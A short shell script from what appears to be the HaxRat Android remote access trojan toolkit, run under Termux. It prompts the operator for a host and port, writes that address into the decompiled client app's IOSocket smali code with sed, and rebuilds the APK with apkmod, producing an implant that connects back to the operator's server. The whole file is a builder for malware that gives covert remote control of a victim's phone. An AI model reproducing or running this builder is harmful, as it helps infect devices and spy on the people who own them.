#!/usr/bin/env sh

smaliFile="smali/com/hax4us/haxrat/IOSocket.smali"

if [ -d $PREFIX/share/haxrat -a -d $HOME/haxRat ]; then
    echo "[!] You installed haxrat by both TermuxBlack and Github so please remove anyone first"
    exit 1
elif [ -d $PREFIX/share/haxrat ]; then
    appPath="$PREFIX/share/haxrat/server/app/factory/decompiled"
else
    appPath="$HOME/haxRat/server/app/factory/decompiled"
fi

read -p "[*] IP/URL/HOST : " host        
read -p "[*] PORT : " port

sed -i "s#http.*#http://$host:$port?model=\"#" $appPath/$smaliFile

apkmod -R "$appPath" -o ~/haxrat/haxRat.apk
